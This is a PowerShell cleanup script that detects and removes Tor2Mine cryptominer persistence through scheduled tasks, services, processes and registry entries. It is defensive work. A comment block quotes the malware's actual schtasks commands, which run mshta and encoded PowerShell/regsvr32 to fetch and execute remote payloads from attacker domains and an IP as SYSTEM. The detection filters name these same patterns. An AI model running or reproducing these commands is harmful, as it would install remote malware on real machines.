#########################################################################################
# Tor2Mine - This script first displays malicious Scheduled Tasks, Services and Active  #
# Processes                                                                             #
# Once you confirm, it continues to delete them.                                        #
# Vikas Singh  - RR                                                                     #
#                                                                                       
#Usage: 
#Runnin the script without any arguments will ask for your confirmation.                
#Running the script with -ForceEnabled will not prompt and continue with removal
#
#Log: C:\Windows\Temp\[Hostname]_Timestamp.txt 
#
#                                                                                       #
#                                                                                       #
#                                                                                       #
#########################################################################################
Param ([switch]$ForceEnabled)

#Logging the Script's Transcript
$LogFile = "$env:windir\temp\" + $env:COMPUTERNAME + "_$(((get-date).ToUniversalTime()).ToString("yyyyMMddTHHmmssZ"))" + ".txt"
Start-Transcript -Path $LogFile -Append

#Pulling Active Processes
$Process = Get-CimInstance Win32_Process | where {($_.Name -like "cmd.exe" -or $_.Name -like "mshta.exe") -and ($_.CommandLine -like "*http://*" -or $_.CommandLine -like "*https://*")} 
$ProcessCount = $Process | Measure-Object | Select-Object Count

#Pulling Bad Services
$serv = Get-WmiObject win32_service | where {($_.PathName -like "cmd /c powershell -exec bypass*" -and $_.PathName -like "*downloadstring*") -or ($_.PathName -like "*powershell*" -and $_.PathName -like "*bypass -e*")  -or $_.Pathname -like "*cmd /c mshta*" }
$servcount = $serv | Measure-Object | Select-Object Count

#Pulling Bad Tasks
$st =  Get-ScheduledTask | where {($_.Actions.Execute -like "*cmd*" -or $_.Actions.Execute -like "*powershell*") -and ($_.Actions.Arguments -like "*/c mshta http*" -or $_.Actions.Arguments -like "*-exec bypass -e *" -or $_.Actions.Arguments -like "* -enc *" -or $_.Actions.Arguments -like "*/c sc start cli_optimization_*"  -or $_.Actions.Arguments -like "*powershell -e cgB*") }
$schtasks = @() 
  ForEach ($SchTask in $st)
{
    $object = New-Object -TypeName PSObject
    $object | Add-Member -MemberType NoteProperty -Name "TaskName" -Value $SchTask.Taskname
    $object | Add-Member -MemberType NoteProperty -Name "Execute" -Value $SchTask.Actions.Execute
    $object | Add-Member -MemberType NoteProperty -Name "Arguments" -Value $SchTask.Actions.Arguments
    $schtasks += $object
}

#Context - Malicious Task Names as Evidence
<#
SCHTASKS  /create /tn \Microsoft\Windows\SetUpd /sc HOURLY /f /mo 1 /tr "powershell -exec bypass -e QwA6AFwAVwBpAG4AZABvAHcAcwBcAEYAbwBuAHQAcwBcAGQAZQBsAC4AcABzADEA" /ru "NT AUTHORITY\SYSTEM"
SCHTASKS  /create /tn \Microsoft\Windows\Shell\WindowsParentalControlsSettings /sc DAILY /f /mo 1 /tr "cmd /c mshta http://eu1.minerpool.pw/check.hta" /ru "NT AUTHORITY\SYSTEM"
SCHTASKS  /create /tn "\Microsoft\Windows Defender\ScannerSchduler" /sc DAILY /f /mo 3 /tr "cmd /c mshta http://res1.myrms.pw/upd.hta" /ru "NT AUTHORITY\SYSTEM"
SCHTASKS  /create /tn \Microsoft\Windows\Diagnosis\ScheduledDiagnosis /sc DAILY /f /mo 2 /tr "cmd /c mshta https://pa.kl2a48yh.pw/check.hta" /ru "NT AUTHORITY\SYSTEM" /RL HIGHEST
SCHTASKS  /create /tn \Microsoft\Windows\Tcpip\IpAddressConflict /sc hourly /f /mo 20 /tr "cmd /c mshta http://107.181.187.132/check.hta" /ru "NT AUTHORITY\SYSTEM"
SCHTASKS  /create /tn "\Microsoft\Windows\Windows Filtering Platform\IP Filter" /sc daily /f /mo 2 /tr "cmd /c mshta https://v1.fym5gserobhh.pw/check.hta" /ru "NT AUTHORITY\SYSTEM"
SCHTASKS  /create /tn "\Microsoft\Windows\Windows Defender\Task Update" /sc daily /f /mo 6 /tr "cmd /c mshta https://eu1.ax33y1mph.pw/check.hta" /ru "NT AUTHORITY\SYSTEM"
SCHTASKS  /create /tn \Microsoft\Windows\WindowsUpdate\AUIFirmwareUpdate /sc daily /f /mo 3 /tr "cmd /c powershell -exec bypass  -e cgBlAGcAcwB2AHIAMwAyACAALwB1ACAALwBzACAALwBpADoAaAB0AHQAcAA6AC8ALwB2ADEALgBmAHkAbQA1AGcAcwBlAHIAbwBiAGgAaAAuAHAAdwAvAHAAaABwAC8AZgB1AG4AYwAuAHAAaABwACAAcwBjAHIAbwBiAGoALgBkAGwAbAA=" /ru "NT AUTHORITY\SYSTEM"
schtasks  /create /tn \Microsoft\Windows\Multimedia\SystemVideoService /tr "cmd /c powershell  -nop -noni -w 1 -enc cgBlAGcAcwB2AHIAMwAyACAALwB1ACAALwBzACAALwBpADoAaAB0AHQAcAA6AC8ALwAxADAANwAuADEAOAAxAC4AMQA4ADcALgAxADMAMgAvAHAAaABwAC8AZgB1AG4AYwAuAHAAaABwACAAcwBjAHIAbwBiAGoALgBkAGwAbAA=" /sc daily /mo 2 /f /ru SYSTEM
schtasks  /create /tn \Microsoft\Windows\Multimedia\CodecUpdateTask /tr "cmd /c mshta https://eu1.minerpool.pw/checks.hta" /sc daily /mo 2 /f /ru SYSTEM
schtasks  /tn \Microsoft\Windows\Diagnosis\DiskDiagnostics /create /f /tr "cmd /c sc start cli_optimization_v2.0.56733_32" /sc DAILY /mo 5 /ru SYSTEM
schtasks  /tn \Microsoft\Windows\Diagnosis\ChkfsScheduled /create /f /tr "cmd /c sc start cli_optimization_v2.0.55728_64" /sc DAILY /mo 2 /ru SYSTEM
schtasks  /tn \Microsoft\Windows\Location\Telemetry /create /f /tr "cmd /c sc start cli_optimization_v2.0.55728_32" /sc DAILY /mo 3 /ru SYSTEM
schtasks  /tn "\Microsoft\Windows\IME\SQM Data Update" /create /f /tr "cmd /c sc start cli_optimization_v2.0.56730_32" /sc DAILY /mo 4 /ru SYSTEM
SCHTASKS  /create /tn \Microsoft\Windows\WDI\UPD /sc HOURLY /f /mo 5 /tr "cmd /c mshta http://eu1.minerpool.pw/upd.hta" /ru "NT AUTHORITY\SYSTEM" /RL HIGHEST
schtasks  /create /TN \Microsoft\Windows\Ras\WinSockets /TR c:\windows\services.exe /ST 00:00 /SC once /DU 59994 /RI 1 /F /RL HIGHEST /RU SYSTEM
SCHTASKS  /create /tn \Microsoft\Windows\UPnP\UPnPHostSearch /sc minute /f /mo 1 /tr "cmd /c schtasks /run /TN \Microsoft\Windows\Ras\WinSockets" /RL HIGHEST /ru "NT AUTHORITY\SYSTEM"
#>

#Pulling REG Renants of Scheduled Tasks
$BaseKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree"
$ListOfTasks = @("\Microsoft\Windows\Windows Filtering Platform\IP Filter",
"\Microsoft\Windows\Diagnosis\ScheduledDiagnosis",
"\Microsoft\Windows\SetUpd" ,
"\Microsoft\Windows\Shell\WindowsParentalControlsSettings",
"\Microsoft\Windows Defender\ScannerSchduler",
"\Microsoft\Windows\Tcpip\IpAddressConflict",
"\Microsoft\Windows\Windows Defender\Task Update",
"\Microsoft\Windows\WindowsUpdate\AUIFirmwareUpdate",
"\Microsoft\Windows\Multimedia\SystemVideoService",
"\Microsoft\Windows\Multimedia\CodecUpdateTask",
"\Microsoft\Windows\Diagnosis\DiskDiagnostics",
"\Microsoft\Windows\Diagnosis\ChkfsScheduled",
"\Microsoft\Windows\Location\Telemetry",
"\Microsoft\Windows\IME\SQM Data Update",
"\Microsoft\Windows\WDI\UPD",
"\Microsoft\Windows\Ras\WinSockets",
"\Microsoft\Windows\UPnP\UPnPHostSearch") 
$ToRemove = New-Object System.Collections.Generic.List[System.Object]


#Only detects dnd displays the malicious tasks and services
function Detect {
    "==========================="
    "Listing Bad Services"
    "==========================="
    Write-Host $servcount.Count "services detected."
    $serv |  select Name, DisplayName, State, PathName

    "==========================="
    "Listing Bad Tasks"
    "==========================="
    Write-Host $schtasks.Count "task(s) detected."
    $schtasks |  Format-list 

    "==========================="
    "Listing Active Processes"
    "==========================="
    Write-Host $ProcessCount.Count "processes detected."
    $Process | select Name, CommandLine

    "==========================="
    "Listing Registry Leftovers"
    "==========================="
    foreach ($t in $ListOfTasks)
    {

    $Check = $BaseKey + $t

    if (Test-Path $Check)
        {
            $BaseKey + $t + " exists."
            $ToRemove.Add($t)
        }
    }
    "================================================"
    "Displaying Malicious Tasks Fragments in Registry"
    "================================================"
    $ToRemove
}

#Attempts to delete the malicious tasks and services which are found by Detect
function RemoveTor2Mine {

param ([switch]$Force)

if ($schtasks.Count -gt 0 -or $servcount.Count -gt 0 -or $ProcessCount.Count -gt 0 -or $ToRemove.Count -gt 0) {

    if (!$Force) {
    "==========================="
    $Confirm = Read-Host "Continue with Removal?[y/n]"
    "==========================="    
    }

    if ($Confirm -eq 'y' -or $Force)     
    {
        "==========================="
        "Removing Bad Tasks"
        "==========================="
        $schtasks | ForEach-Object {
        "Removing " + $_.Taskname
        Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false}

        "==========================="
        "Removing Bad Services"
        "==========================="
        $serv | ForEach-object{ 
        "Removing " + $_.Name
        cmd /c  sc delete $_.Name }

        "==========================="
        "Terminating Active Processes"
        "==========================="
        $Process | ForEach-object{ "Terminating " + $_.Name + " with cmdline " + $_.CommandLine ; wmic process $_.ProcessID delete} 

        "==========================="
        "Removing Registry Remnants"
        "==========================="
        $ToRemove | ForEach-Object {"Removing " + $_ ; 
        schtasks /delete /tn $_ /f }
    }
  }
}

Detect

#To ensure the list of processes is displayed correctly
sleep -s 1

if ($ForceEnabled) { RemoveTor2Mine -Force }
else { RemoveTor2Mine }

Stop-Transcript